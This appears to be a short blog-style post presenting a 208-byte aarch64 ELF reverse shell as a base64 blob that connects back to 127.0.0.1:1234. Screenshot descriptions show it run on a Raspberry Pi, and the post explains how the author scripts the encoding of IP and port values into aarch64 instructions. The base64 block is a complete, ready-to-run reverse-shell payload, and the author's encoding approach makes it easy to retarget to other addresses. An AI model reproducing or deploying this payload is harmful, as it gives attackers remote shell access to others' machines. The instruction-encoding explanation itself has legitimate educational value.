# 208 byte aarch64 ELF reverse shell

Originally posted 2022-11-16

Reverse shell, connects back to 127.0.0.1:1234

Base64 (280 characters)
```
f0VMRsgYgNICAIDSAgAAFAIAtwAhAIDSBAAAFAAAAABAAAAAAAAAAEAAgNIBAADUCgAAFE
AAOAABAAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAAAUAAAAAOMDACoFAAAUABAAAAAAAAAA
EAAAAAAAAGgZgNICAoDSQQCA0oFAuvLhD8DyASDg8uEPH/jhAwCRAQAA1AgDgNJhAIDS4g
MfquADAyohBADxAQAA1IH//1SoG4DS4EWM0iDNrfLgZc7yAA3g8uADAPngAwCRAQAA1A==
```

Running on a raspberry pi 4 with the latest kernel

![two terminals, one loading the base64 into a file called nice.bin and executing it, and another terminal catching the reverse shell and running ls to show the size of the binary](https://user-images.githubusercontent.com/26436276/209994747-bd16dde4-342f-4f34-afff-24bcd37b7409.png)

I was playing with automatically encoding certain aarch64 instructions so I can script out certain payloads and this was my PoC. It's a bit trickier to encode bc of how aarch64 is packed but it's not that crazy.

![a python function that encodes IP and Port values and places them in instruction templates and returns the buffer of bytes](https://user-images.githubusercontent.com/26436276/209994818-3adac183-72b2-495e-b23c-8ab71ff35142.png)

I made this little diagram to explain aarch64 instruction encoding. Each instruction is movk x1, somevalue, some shift here. But you can see things like where in x1 the value is places (denoted by the shift or hw field) and then the immediate value which is highlighted in orange.

![listing of aarch64 instructions with annotated bits](https://user-images.githubusercontent.com/26436276/209994890-b086b2cf-a306-46bf-ba8c-80f6568b4c3e.png)

The encoding is different for each class of instructions, but you'll have to read the instruction set docs for full explanation of each. Just wanted to show what goes into encoding an instruction for those curious.
